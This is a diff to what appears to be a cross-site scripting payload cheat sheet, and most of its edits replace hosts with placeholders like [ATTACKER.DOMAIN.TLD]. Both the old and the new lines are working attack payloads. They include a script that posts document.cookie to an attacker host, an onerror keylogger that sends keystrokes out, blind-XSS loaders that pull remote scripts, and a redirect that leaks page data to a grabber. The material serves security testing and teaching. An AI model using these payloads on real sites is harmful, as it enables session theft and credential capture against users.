@@ -84,7 +84,7 @@ fclose($fp);
 
 ```html
 <script>
-  fetch('https://<SESSION>.burpcollaborator.net', {
+  fetch('https://[ATTACKER.DOMAIN.TLD]', {
   method: 'POST',
   mode: 'no-cors',
   body: document.cookie
@@ -108,7 +108,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 Another way to collect sensitive data is to set a javascript keylogger.
 
 ```javascript
-<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
+<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
 ### Other Ways
@@ -152,7 +152,7 @@ Example:
 <script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
 ```
 
-References:
+Additional reading:
 
 - [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
 - [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
@@ -401,7 +401,7 @@ SVG 1.x (xlink:href)
 
 ```xml
 <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
+  <image xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg" height="200" width="200"/>
 </svg>
 ```
 
@@ -411,7 +411,7 @@ SVG 1.x (xlink:href)
 
 ```xml
 <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
+  <use xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning"/>
 </svg>
 ```
 
@@ -470,7 +470,7 @@ div  {
 
 <script>
 document.getElementById('btn').onclick = function(e){
-    window.poc = window.open('http://www.redacted.com/#login');
+    window.poc = window.open('http://10.10.10.10/#login');
     setTimeout(function(){
         window.poc.postMessage(
             {
@@ -499,9 +499,9 @@ You can set up an alternative version
 - Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
 
 ```xml
-"><script src="https://js.rip/<custom.name>"></script>
-"><script src=//<custom.subdomain>.xss.ht></script>
-<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
+"><script src="https://js.rip/[ATTACKER.DOMAIN.TLD]"></script>
+"><script src=//[ATTACKER.DOMAIN.TLD]></script>
+<script>$.getScript("//[ATTACKER.DOMAIN.TLD]")</script>
 ```
 
 ### Other Blind XSS tools
@@ -530,7 +530,7 @@ You can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server t
 Eg. payload
 
 ```html
-<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>
 ```
 
 Eg. one-line HTTP server:
